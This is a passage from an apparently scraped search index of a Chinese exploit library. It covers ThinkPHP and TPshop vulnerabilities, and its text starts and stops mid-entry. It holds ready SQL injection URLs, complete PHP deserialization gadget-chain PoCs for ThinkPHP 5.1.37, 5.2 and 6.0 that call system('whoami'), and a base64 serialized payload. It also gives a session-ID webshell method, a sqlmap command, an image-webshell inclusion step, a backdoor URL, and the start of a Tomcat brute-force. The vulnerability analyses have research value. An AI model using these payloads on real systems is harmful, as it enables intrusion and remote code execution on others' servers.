和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); 访问 http://localhost:8000/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.1.23 版本更新说明中，发现其中提到该版本增强了 order 方法的安全性。 通过查阅其 commit 记录，发现其修改了 Builder.php 文件中的 parseOrder 方法。其添加了一个 if 语句判断，来过滤 )、# 两个符号。 接下来，我们直接跟着上面的攻击 payload 来看看漏洞原理。首先程序通过 input 方法获取数据，并通过 filterCalue 方法进行简单过滤，但是根本没有对数组的键进行过滤处理。 接着数据就原样被传入数据库操作相关方法中。在 Query 类的 order 方法中，我们可以看到数据没有任何过滤，直接存储在 $this->options['order'] 中。（下图 第19行 ） 接着来到 find 方法，在 Connection 类的 find 方法中调用 Builder 类的 select 方法来生成 SQL 语句。相信大家对 Builder 类的 select 方法应该不会陌生吧，因为前几篇分析文章中都有提及这个方法。这个方法通过 str_replace 函数将数据填充到 SQL 模板语句中。这次我们要关注的是 parseOrder 方法，这个方法在新版的 ThinkPHP 中做了代码调整，我们跟进。 在 parseOrder 方法中，我们看到程序通过 parseKey 方法给变量两端都加上了反引号（下图 第26行 ），然后直接拼接字符串返回（下图 第17行 ），没有进行任何过滤、检测，这也是导致本次 SQL注入漏洞 的原因。 漏洞修复 官方的修复方法是：在拼接字符串前对变量进行检查，看是否存在 )、# 两个符号。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 10:22:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/15.html":{"url":"0day/Thinkphp/15.html","title":"（CVE-2018-16385）Thinkphp < 5.1.23","keywords":"","body":"（CVE-2018-16385）Thinkphp 5.1.x SQL注入 一、漏洞简介 在ThinkPHP5.1.23之前的版本中存在SQL注入漏洞，该漏洞是由于程序在处理order by 后的参数时，未正确过滤处理数组的key值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。 二、漏洞影响 ThinkPHP 三、复现过程 环境搭建 1.下载安装thinkphp5.1.x 对于thinkphp5.1.x完整版，目前官方没有直接下载的链接。Github上只是放出核心版。该版本需要以Composer或Git方式进行安装。 这里以Composer安装方式说明。 在 Linux 和 Mac OS X 中可以运行如下命令： curl -sS https://getcomposer.org/installer | php mv composer.phar/usr/local/bin/composer 在 Windows 中，你需要下载并运行 Composer-Setup.exe 。 安装好之后，切换路径到WEB目录下运行： composercreate-project topthink/think=5.1.1 tp5.1 --prefer-dist 然后会生成一个名为tp5.1的文件夹。到此think5.1.1下载成功。 2.然后在浏览器中访问 image.png如果出现该页面，则证明安装成功。 3.Demo示例 编写Demo文件，并将文件命名为Test.php，然后放在/tp5.1/application/index/controller/目录下。 4.数据库 与Demo文件匹配，需要创建一个user表，然后设一个字段(id)。 Payload构造 根据以上分析，构造payload需要满足以下条件： 1.传入的$order需要是一个数组。 2.$val 必须也是数组。 3.至少知道数据库表中的一个字段名称，并且传入两个参数。 4.闭合 ` 。 最终Payload构造如下： http://0-sec.org/tp5.1/public/index/test/index?order[id`,111)|updatexml(1,concat(0x3a,user()),1)%23][]=1 或 http://0-sec.org/tp5.1/public/index/test/index?order[id`,'aaa')| updatexml(1,concat(0x3a,user()),1)%23][]=1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 15:40:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入3.html":{"url":"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入3.html","title":"Thinkphp5 全版本","keywords":"","body":"Thinkphp5 全版本 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ select 方法注入）。次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。 二、漏洞影响 ThinkPHP5全版本 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.10 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.10\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username'); $result = db('users')->where('username','exp',$username)->select(); return 'select success'; } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); poc http://0-sec.org:8000/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)# 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 由于官方根本不认为这是一个漏洞，而认为这是他们提供的一个功能，所以官方并没有对这个问题进行修复。但笔者认为这里的数据过滤还是存在问题的，所以我们还是来分析分析这个漏洞。 程序默认调用 Request 类的 get 方法中会调用该类的 input 方法，但是该方法默认情况下并没有对数据进行很好的过滤，所以用户输入的数据会原样进入框架的 SQL 查询方法中。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。 上面的 $this->builder 为 \\think\\db\\builder\\Mysql 类，该类继承于 Builder 类，所以接着会调用 Builder 类的 select 方法。在 select 方法中，程序会对 SQL 语句模板用变量填充，其中用来填充 %WHERE% 的变量中存在用户输入的数据。我们跟进这个 where 分析函数，会发现其会调用生成查询条件 SQL 语句的 buildWhere 函数。 继续跟进 buildWhere 函数，发现用户可控数据又被传入了 parseWhereItem where子单元分析函数。我们发现当操作符等于 EXP 时，将来自用户的数据直接拼接进了 SQL 语句，最终导致了 SQL注入漏洞 。 漏洞修复 未修复。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 10:18:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/12.html":{"url":"0day/Thinkphp/12.html","title":"Thinkphp 5.1.37 反序列化漏洞","keywords":"","body":"Thinkphp 5.1.37 反序列化漏洞 一、漏洞简介 所有Thinkphp版本下载链接 https://packagist.org/packages/topthink/framework 二、漏洞影响 三、复现过程 环境搭建 composer create-project topthink/think=5.1.37 v5.1.37 poc演示截图 调用链 单步调试 漏洞起点在\\thinkphp\\library\\think\\process\\pipes\\windows.php的__destruct魔法函数。 public function __destruct() { $this->close(); $this->removeFiles(); } private function removeFiles() { foreach ($this->files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this->files = []; } 这里同时也存在一个任意文件删除的漏洞，exp如下 files=['C:\\FakeD\\Software\\phpstudy\\PHPTutorial\\WWW\\shell.php']; } } echo base64_encode(serialize(new Windows())); 这里$filename会被当做字符串处理，而toString 当一个对象被反序列化后又被当做字符串使用时会被触发，我们通过传入一个对象来触发toString 方法。 //thinkphp\\library\\think\\model\\concern\\Conversion.php public function __toString() { return $this->toJson(); } //thinkphp\\library\\think\\model\\concern\\Conversion.php public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this->toArray(), $options); } //thinkphp\\library\\think\\model\\concern\\Conversion.php public function toArray() { $item = []; $hasVisible = false; ... if (!empty($this->append)) { foreach ($this->append as $key => $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this->getRelation($key); if (!$relation) { $relation = $this->getAttr($key); if ($relation) { $relation->visible($name); } } ... } //thinkphp\\library\\think\\model\\concern\\Attribute.php public function getAttr($name, &$item = null) { try { $notFound = false; $value = $this->getData($name); } catch (InvalidArgumentException $e) { $notFound = true; $value = null; } 。。。 return $value; } //thinkphp\\library\\think\\model\\concern\\Attribute.php public function getData($name = null) { if (is_null($name)) { return $this->data; } elseif (array_key_exists($name, $this->data)) { return $this->data[$name]; } elseif (array_key_exists($name, $this->relation)) { return $this->relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name); } 这里的$this->append是我们可控的，然后通过getRelation($key)，但是下面有一个!$relation,所以我们只要置空即可，然后调用getAttr($key),在调用getData($name)函数，这里$this->data['name']我们可控，之后回到toArray函数，通过这一句话$relation->visible($name); 我们控制$relation为一个类对象，调用不存在的visible方法，会自动调用call方法，那么我们找到一个类对象没有visible方法，但存在call方法的类，这里 可以看到这里有一个我们熟悉的回调函数call_user_func_array，但是这里有一个卡住了，就是array_unshift，这个函数把request对象插入到数组的开头，虽然这里的this->hook[$method]我们可以控制，但是构造不出来参数可用的payload，因为第一个参数是$this对象。 目前我们所能控制的内容就是 也就是我们能调用任意类的任意方法。 下面我们需要找到我们想要调用的方法，参考我之前分析的thinkphp-RCE的文章thinkphp-RCE漏洞分析,最终产生rce的地方是在input函数当中，那我们这里可否直接调用input方法呢，刚刚上面已经说了，参数已经固定死是request类，那我们需要寻找不受这个参数影响的方法。这里采用回溯的方法 public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // 获取原始数据 return $data; } $name = (string) $name; if ('' != $name) { // 解析name if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } $data = $this->getData($data, $name); if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } // 解析过滤器 $filter = $this->getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', 'arrayReset($data); } } else { $this->filterValue($data, $name, $filter); } 。。。 protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this->filter; if (is_string($filter) && false === strpos($filter, '/')) { $filter = explode(',', $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } protected function getData(array $data, $name) { foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { return; } } return $data; } 这里$filter可控，data参数不可控，而且$name = (string) $name;这里如果直接调用input的话，执行到这一句的时候会报错，直接退出，所以继续回溯，目的是要找到可以控制$name变量，使之最好是字符串。同时也要找到能控制data参数 public function param($name = '', $default = null, $filter = '') { if (!$this->mergeParam) { $method = $this->method(true); // 自动获取请求变量 switch ($method) { case 'POST': $vars = $this->post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this->put(false); break; default: $vars = []; } // 当前请求参数和URL地址中的参数合并 $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false)); $this->mergeParam = true; } if (true === $name) { // 获取包含文件上传信息的数组 $file = $this->file(); $data = is_array($file) ? array_merge($this->param, $file) : $this->param; return $this->input($data, '', $default, $filter); } return $this->input($this->param, $name, $default, $filter); } array_merge($this->param, $this->get(false), $vars, $this->route(false)); public function get($name = '', $default = null, $filter = '') { if (empty($this->get)) { $this->get = $_GET; } return $this->input($this->get, $name, $default, $filter); } public function route($name = '', $default = null, $filter = '') { return $this->input($this->route, $name, $default, $filter); } public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { // 获取原始数据 return $data; } ... } 可以看到这里this->param完全可控，是通过get传参数进去的，那么也就是说input函数中的$data参数可控，也就是call_user_func的$value,现在差一个条件，那就是name是字符串，继续回溯。 public function isAjax($ajax = false) { $value = $this->server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) { return $result; } $result = $this->param($this->config['var_ajax']) ? true : $result; $this->mergeParam = false; return $result; } 可以看到这里$this->config['var_ajax']可控，那么也就是name可控，所有条件聚齐。成功导致rce。 补充： \"asdfasdf\",'id'=>'whoami'); array_walk_recursive($data, \"filterValue\", \"system\"); poc v5.1.37 append = [\"ethan\"=>[\"dir\",\"calc\"]]; $this->data = [\"ethan\"=>new Request()]; } } class Request { protected $hook = []; protected $filter = \"system\"; protected $config = [ // 表单请求类型伪装变量 'var_method' => '_method', // 表单ajax伪装变量 'var_ajax' => '_ajax', // 表单pjax伪装变量 'var_pjax' => '_pjax', // PATHINFO变量名 用于兼容模式 'var_pathinfo' => 's', // 兼容PATH_INFO获取 'pathinfo_fetch' => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'], // 默认全局过滤方法 用逗号分隔多个 'default_filter' => '', // 域名根，如thinkphp.cn 'url_domain_root' => '', // HTTPS代理标识 'https_agent_name' => '', // IP代理获取标识 'http_agent_ip' => 'HTTP_X_REAL_IP', // URL伪静态后缀 'url_html_suffix' => 'html', ]; function __construct(){ $this->filter = \"system\"; $this->config = [\"var_ajax\"=>'']; $this->hook = [\"visible\"=>[$this,\"isAjax\"]]; } } namespace think\\process\\pipes; use think\\model\\concern\\Conversion; use think\\model\\Pivot; class Windows { private $files = []; public function __construct() { $this->files=[new Pivot()]; } } namespace think\\model; use think\\Model; class Pivot extends Model { } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); /*input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami*/ ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 19:00:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/13.html":{"url":"0day/Thinkphp/13.html","title":"Thinkphp 5.2.*-dev 反序列化漏洞","keywords":"","body":"Thinkphp 5.2.*-dev 反序列化漏洞 一、漏洞简介 所有Thinkphp版本下载链接 https://packagist.org/packages/topthink/framework 二、漏洞影响 三、复现过程 环境搭建 composer create-project topthink/think=5.2.*-dev v5.2 poc演示截图 调用链 单步调试 可以看到前面的链跟tp5.1.x的一样，这里不在列举，直接进去toArray函数，可以看到$data可控 public function toArray(): array { 。。。 $data = array_merge($this->data, $this->relation); foreach ($data as $key => $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this->visible[$key])) { $val->visible($this->visible[$key]); } elseif (isset($this->hidden[$key])) { $val->hidden($this->hidden[$key]); } // 关联模型对象 $item[$key] = $val->toArray(); } elseif (isset($this->visible[$key])) { $item[$key] = $this->getAttr($key); } elseif (!isset($this->hidden[$key]) && !$hasVisible) { $item[$key] = $this->getAttr($key); } } 。。。 public function getAttr(string $name) { try { $relation = false; $value = $this->getData($name); } catch (InvalidArgumentException $e) { $relation = true; $value = null; } return $this->getValue($name, $value, $relation); } public function getData(string $name = null) { if (is_null($name)) { return $this->data; } $fieldName = $this->getRealFieldName($name); if (array_key_exists($fieldName, $this->data)) { return $this->data[$fieldName]; ... } } protected function getRealFieldName(string $name): string { return $this->strict ? $name : App::parseName($name); //this->strict默认为true } 可以看到getAttr函数中的$value可控，那么导致$this->getValue($name, $value, $relation);这里的三个参数都可控，跟进$this->getValue($name, $value, $relation); protected function getValue(string $name, $value, bool $relation = false) { // 检测属性获取器 $fieldName = $this->getRealFieldName($name); $method = 'get' . App::parseName($name, 1) . 'Attr'; if (isset($this->withAttr[$fieldName])) { if ($relation) { $value = $this->getRelationValue($name); } $closure = $this->withAttr[$fieldName]; $value = $closure($value, $this->data); 这里$fieldName、$this->withAttr，导致$closure也可控，最终直接产生RCE。如下图 补充： poc v5.2.*-dev files = array($files); } } } namespace think\\model\\concern { trait Conversion { protected $append = array(\"Smi1e\" => \"1\"); } trait Attribute { private $data; private $withAttr = array(\"Smi1e\" => \"system\"); public function get($system) { $this->data = array(\"Smi1e\" => \"$system\"); } } } namespace think { abstract class Model { use model\\concern\\Attribute; use model\\concern\\Conversion; } } namespace think\\model{ use think\\Model; class Pivot extends Model { public function __construct($system) { $this->get($system); } } } namespace{ $Conver = new think\\model\\Pivot(\"whoami\"); $payload = new think\\process\\pipes\\Windows($Conver); echo base64_encode(serialize($payload)); } ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 19:00:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/14.html":{"url":"0day/Thinkphp/14.html","title":"Thinkphp 6.0.*-dev 反序列化漏洞","keywords":"","body":"Thinkphp 6.0.*-dev 反序列化漏洞 一、漏洞简介 所有Thinkphp版本下载链接 https://packagist.org/packages/topthink/framework 二、漏洞影响 三、复现过程 环境搭建 composer create-project topthink/think=6.0.*-dev v6.0 poc演示截图 调用链 单步调试 //vendor\\topthink\\think-orm\\src\\Model.php public function __destruct() { if ($this->lazySave) { //$this->lazySave可控 $this->save(); } } //vendor\\topthink\\think-orm\\src\\Model.php public function save(array $data = [], string $sequence = null): bool { // 数据对象赋值 $this->setAttrs($data); if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) { return false; } $result = $this->exists ? $this->updateData() : $this->insertData($sequence); //this->exists可控 if (false === $result) { return false; } //vendor\\topthink\\think-orm\\src\\Model.php public function isEmpty(): bool { return empty($this->data); //可控 } protected function trigger(string $event): bool { if (!$this->withEvent) { //可控 return true; } ... } protected function updateData(): bool { // 事件回调 if (false === $this->trigger('BeforeUpdate')) { //可控 return false; } $this->checkData(); // 获取有更新的数据 $data = $this->getChangedData(); if (empty($data)) { //$data可控 // 关联更新 if (!empty($this->relationWrite)) { $this->autoRelationUpdate(); } return true; } if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) { // 自动写入更新时间 $data[$this->updateTime] = $this->autoWriteTimestamp($this->updateTime); $this->data[$this->updateTime] = $data[$this->updateTime]; } // 检查允许字段 $allowFields = $this->checkAllowFields(); public function getChangedData(): array { $data = $this->force ? $this->data : array_udiff_assoc($this->data, $this->origin, function ($a, $b) { if ((empty($a) || empty($b)) && $a !== $b) { return 1; } //$this->force可控 return is_object($a) || $a != $b ? 1 : 0; }); // 只读字段不允许更新 foreach ($this->readonly as $key => $field) { if (isset($data[$field])) { unset($data[$field]); } } return $data; } protected function checkAllowFields(): array { // 检测字段 if (empty($this->field)) { //$this->field可控 if (!empty($this->schema)) { //$this->schema可控 $this->field = array_keys(array_merge($this->schema, $this->jsonType)); } else { $query = $this->db(); $table = $this->table ? $this->table . $this->suffix : $query->getTable(); public function db($scope = []): Query { /** @var Query $query */ $query = self::$db->connect($this->connection) //$this->connection可控 ->name($this->name . $this->suffix) //$this->suffix可控，采用拼接，调用_toString ->pk($this->pk); 后面的链跟之前的一样，这里就不分析了 poc v6.0.*-dev data = array(\"wh1t3p1g\"=>\"whoami\"); $this->relation = array(\"wh1t3p1g\"=>[]); $this->visible= array(\"wh1t3p1g\"=>[]); $this->withAttr = array(\"wh1t3p1g\"=>\"system\"); }else{ $this->lazySave = true; $this->withEvent = false; $this->exists = true; $this->force = true; $this->data = array(\"wh1t3p1g\"=>[]); $this->connection = \"mysql\"; $this->suffix = $obj; } } } } namespace think\\model { class Pivot extends \\think\\Model{ function __construct($obj) { parent::__construct($obj); } } } namespace { $pivot1 = new \\think\\model\\Pivot(null); $pivot2 = new \\think\\model\\Pivot($pivot1); echo base64_encode(serialize($pivot2)); } 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-21 23:52:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之文件包含7.html":{"url":"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之文件包含7.html","title":"5.0.0 <= Thinkphp <=5.0.18 文件包含漏洞","keywords":"","body":"5.0.0 一、漏洞简介 本次漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致 文件包含漏洞 的产生。 二、漏洞影响 5.0.0 5.1.0 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.18 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.0.18\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： assign(request()->get()); return $this->fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html } } 创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。 poc http://0-sec.org:8000/index/index/index?cacheFile=demo.php 接着访问链接，即可触发 文件包含漏洞 。 漏洞分析 首先在官方发布的 5.0.19 版本更新说明中，发现其中提到该版本包含了一个安全更新。 我们可以查阅其 commit 记录，发现其改进了模板引擎，其中存在危险函数 extract ，有可能引发变量覆盖漏洞。接下来，我们直接跟进代码一探究竟。 首先，用户可控数据未经过滤，直接通过 Controller 类的 assign 方法进行模板变量赋值，并将可控数据存在 think\\View 类的 data 属性中。 接着，程序开始调用 fetch 方法加载模板输出。这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html ，如果默认路径模板不存在，程序就会报错。 我们跟进到 Template 类的 fetch 方法，可以发现可控变量 $vars 赋值给 $this->data 并最终传入 File 类的 read 方法。而 read 方法中在使用了 extract 函数后，直接包含了 $cacheFile 变量。这里就是漏洞发生的关键原因（可以通过 extract 函数，直接覆盖 $cacheFile 变量，因为 extract 函数中的参数 $vars 可以由用户控制）。 漏洞修复 官方的修复方法是：先将 $cacheFile 变量存储在 $this->cacheFile 中，在使用 extract 函数后，最终 include 的变量是 $this->cacheFile ，这样也就避免了 include 被覆盖后的变量值。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 11:08:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/16.html":{"url":"0day/Thinkphp/16.html","title":"Thinkphp < 6.0.2 session id未作过滤导致getshell","keywords":"","body":"Thinkphp 一、漏洞简介 二、漏洞影响 Thinkphp 三、复现过程 漏洞分析 通过diff github上面的6.0.1和6.0.2的代码可以发现，6.0.1在设置session id时未对值进行ctype_alnum()校验，从而导致可以传入任意字符。 传入任意字符会有什么危害？一般来说程序可能会以session id作为文件名来创建对应的session文件，但是到目前为止这只是猜测。看一下保存session是怎么写的。 public function save(): void { $this->clearFlashData(); $sessionId = $this->getId(); if (!empty($this->data)) { $data = $this->serialize($this->data); $this->handler->write($sessionId, $data); } else { $this->handler->delete($sessionId); } $this->init = false; } 先获取sessionid，然后作为第一个参数传入$this->handler->write()。$this->handler在构造函数中被初始化 public function __construct($name, SessionHandlerInterface $handler, array $serialize = null) { $this->name = $name; $this->handler = $handler; if (!empty($serialize)) { $this->serialize = $serialize; } $this->setId(); } 可以看出$handler的类型是SessionHandlerInterface，全局发现这是一个接口，实现这个接口的类有两个，一个是File，一个是Cache。这里以File类为例，我们跟进它的write()方法 public function write(string $sessID, string $sessData): bool { $filename = $this->getFileName($sessID, true); $data = $sessData; if ($this->config['data_compress'] && function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } return $this->writeFile($filename, $data); } 这里先通过第一个参数（也就是session id）来构造$filename，然后判断是否需要对session数据进行压缩，默认是不需要的，最后return时调用$this->writeFile()。先看看文件名是如何构造的，跟进$this->getFileName() protected function getFileName(string $name, bool $auto = false): string { if ($this->config['prefix']) { $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name; } else { $name = 'sess_' . $name; } $filename = $this->config['path'] . $name; ... return $filename; } 这里直接将第一个参数拼接到路径的最后。跟进之前的$this->writeFile()方法 protected function writeFile($path, $content): bool { return (bool) file_put_contents($path, $content, LOCK_EX); } 刺激了，这里直接保存了文件。纵观全局，由于程序未对session id进行危险字符判断，只要将session id写为类似于xxxx.php的格式，即可导致session保存成.php文件，从而getshell。 漏洞复现 通过全局搜索setId发现在think/middleware/SessionInit.php:handle():L59发生了调用。 public function handle($request, Closure $next) { // Session初始化 $varSessionId = $this->app->config->get('session.var_session_id'); $cookieName = $this->session->getName(); if ($varSessionId && $request->request($varSessionId)) { $sessionId = $request->request($varSessionId); } else { $sessionId = $request->cookie($cookieName); } if ($sessionId) { $this->session->setId($sessionId); } ... 由于session.var_session_id默认是空，这里的$sessionId的值由$request->cookie($cookieName)获得，$cookieName经过跟进后发现默认是PHPSESSID。 因此我们只要设置Cookie中的PHPSESSID的值为1234567890123456789012345678.php即可。 我们在index控制器中添加如下action public function testsession2(){ $username = Request::get('name'); Session::set('username', $username); return 'hi'; } 用于获取name参数，并将之设置到session中。 访问url：http://127.0.0.1/tp6/public/index.php/index/testsession2?name= 访问session文件，一般位于项目根目录下的./runtime/session/文件夹下，也就是/runtime/session/sess_1234567890123456789012345678.php 参考链接 https://xz.aliyun.com/t/7109 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 00:44:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp shop/1.html":{"url":"0day/Thinkphp shop/1.html","title":"Thinkphp Shop前台SQL注入","keywords":"","body":"Thinkphp Shop前台SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/mobile/index/index2/id/1' sqlmap -u \"http://www.0-sec.org/mobile/index/index2/id/1*\" --random-agent --batch --dbms \"mysql\" --current-db 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 14:55:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp shop/2.html":{"url":"0day/Thinkphp shop/2.html","title":"（CVE-2018-9919）Thinkphp Shop后门","keywords":"","body":"（CVE-2018-9919）Thinkphp Shop后门 一、漏洞简介 该漏洞源于/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php可以将文件下载到其他服务器上。远程攻击者可利用该漏洞获取敏感信息，并可能执行命令。 二、漏洞影响 Backdoor in Tpshop 三、复现过程 攻击者可以利用此漏洞来攻击服务器并增加其特权，例如：下载任意文件PS！扫描网络端口PS！信息检测，攻击内部网络易受攻击的服务器。 http://www.0-sec.org/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php?bddlj=save_filename&down_url=download_url&jmmy=decryptpass 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 14:53:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp shop/3.html":{"url":"0day/Thinkphp shop/3.html","title":"Thinkphp Shop 供应商后台本地文件包含导致权限提升","keywords":"","body":"Thinkphp Shop 供应商后台本地文件包含导致权限提升 一、漏洞简介 二、漏洞影响 三、复现过程 1、用户个人资料修改处上传图片 http://www.0-sec.org/Home/User/info.html 2、上传一张正常图片，并在图片末尾加上一句话 3、返回shell http://www.0-sec.org/supplier/order/delivery_print?template=public/upload/user/4575/head_pic/5989ee42cc5992e64a60c52b0cbb7602.png&w=phpinfo(); 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 15:04:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/Tomcat 后台爆破getshell.html":{"url":"0day/Tomcat/Tomcat 后台爆破getshell.html","title":"Tomcat 后台爆破","keywords":"","body":"Tomcat 后台爆破 一、漏洞简介 二、漏洞影响 三、复现过程 在渗透测试中，我们经常遇到tomcat后台被默认部署在外部的情况，类似于http://192.168.3.204:8080/host-manager/html 在这种情况下，我们都会选择去爆破来进入后台部署shell。 先抓取一下我们的登录包： GET /host-manager/html HTTP/1.1 Host: 192.168.3.204:8080 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 FirePHP/0.7.4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 